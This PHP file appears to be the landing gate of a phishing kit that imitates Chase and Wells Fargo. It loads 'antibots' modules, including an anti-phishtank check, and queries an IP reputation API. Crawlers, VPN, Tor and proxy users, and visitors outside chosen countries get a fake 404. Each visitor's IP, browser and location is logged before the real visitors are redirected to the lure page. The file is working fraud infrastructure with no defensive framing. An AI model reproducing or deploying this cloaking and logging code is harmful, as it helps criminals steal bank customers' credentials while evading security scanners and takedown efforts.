<?php

session_start();
include'antibots/IP-BlackList.php';  
include'antibots/Bot-Crawler.php';
include'antibots/Bot-Spox.php'; 
include'antibots/Dila_DZ.php';
@require "antibots/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;
$antibots = trim(file_get_contents("admin/config/status_antibots.ini"));
$block_vpn = trim(file_get_contents("admin/config/blockVpn.ini"));
if($antibots == "on"){
    include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
    }
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$details = "http://ip-api.com/json/{$ip}";
file_put_contents('results/total_click.txt', $ip . PHP_EOL, FILE_APPEND);
file_put_contents('results/UserAgents.txt', $browser . PHP_EOL, FILE_APPEND);
require 'results/geo.php';
$_SESSION['ip'] = clientData('ip');
$_SESSION['ip_countryName'] = clientData('country');
$_SESSION['ip_countryCode'] = clientData('code');
$_SESSION['ip_city'] = clientData('city');
$_SESSION['ip_state'] = clientData('state');
$_SESSION['ip_timezone'] = clientData('timezone');
$_SESSION['currency'] = clientData('currency');
$_SESSION['os'] = getOs();
$_SESSION['browser'] = getBrowser();
date_default_timezone_set('GMT');
$dateNow = date("d/m/Y H:i:s A");
include 'results/click.php';
$code = "{$_SESSION['ip']} | {$dateNow} | {$_SESSION['os']} | {$_SESSION['browser']} | {$_SESSION['computer']} | {$_SESSION['ip_countryName']} | {$_SESSION['ip_city']} | {$_SESSION['ip_state']} | {$_SESSION['currency']}\r\n";
$save = fopen("results/info.txt", "a+");
fwrite($save, $code);
fclose($save);

$Wells_SESSION_Mafiso = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));

include "set.php";
$domain =   $_SERVER['HTTP_HOST'];
 if ($redirection=="yes") {
    if (isset($_GET['id'])) {
     $id = isset($_GET['id']) ? trim(htmlentities($_GET['id'])):'';
      if ($id !== $redirect) {
        exit(header("Location: 404"));
      }
    }else{
        exit(header("Location: 404"));
        
    }
  }
if ($allow_country=="yes") {
	if ($_SESSION['ip_countryCode']=='US' || $_SESSION['ip_countryCode']=='EG') {	  
	   }else{
	   	exit(header("HTTP/1.0 404 Not Found"));
	   }
	  }
if ($api_protection=="yes") {

        $ch=curl_init();
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch,CURLOPT_URL,"https://www.ipqualityscore.com/api/json/ip/".$Key."/".$_SESSION['ip']."");
        curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
        curl_setopt($ch,CURLOPT_TIMEOUT,400);
        $json=curl_exec($ch);

                $proxy = trim(strip_tags(get_string_between($json,'"proxy":',',"')));
                $tor = trim(strip_tags(get_string_between($json,'"tor":',',"')));
                $vpn = trim(strip_tags(get_string_between($json,'vpn":',',"')));
                $is_crawler = trim(strip_tags(get_string_between($json,'is_crawler":',',"')));
                $fraud_score = trim(strip_tags(get_string_between($json,'fraud_score":',',"')));
                $success = trim(strip_tags(get_string_between($json,'success":',',"')));
                $key = substr(sha1(mt_rand()),1,30);
            
            if ($anti_proxy=="yes") { if ($proxy == "true") {
                exit(header("HTTP/1.0 404 Not Found"));
                }
            } 

            if ($anti_tor=="yes") { if ($tor == "true") {
                exit(header("HTTP/1.0 404 Not Found"));
                }
            }

            if ($anti_vpn=="yes") { if ($vpn == "true") {
                exit(header("HTTP/1.0 404 Not Found"));
                }
            }

            if ($anti_web_crawler=="yes") { if ($is_crawler == "true") {
                exit(header("HTTP/1.0 404 Not Found"));
                }
            }

            if ($fraud_score >= "".$max_fraud_score."") {
                exit(header("HTTP/1.0 404 Not Found"));
            }

            if ($success == "false") {
                echo "YOUR API PROTECTION IS DEAD";
                }else{
                    $_SESSION['Wells_Mafiso'] = $Wells_SESSION_Mafiso;
                    
                    $_SESSION['check'] = "true";
                    header("Location: present?Chase_id=".$key."&country=".$_SESSION['ip_countryName']."&iso=".$_SESSION['ip_countryCode']."");
                    exit;

            
            }}
else{
    $_SESSION['check'] = "true";
   $_SESSION['Wells_Mafiso'] = $Wells_SESSION_Mafiso;
    header("Location: present?Chase_id=".$key."&country=".$_SESSION['ip_countryName']."&iso=".$_SESSION['ip_countryCode']."");
    exit;
}







?>
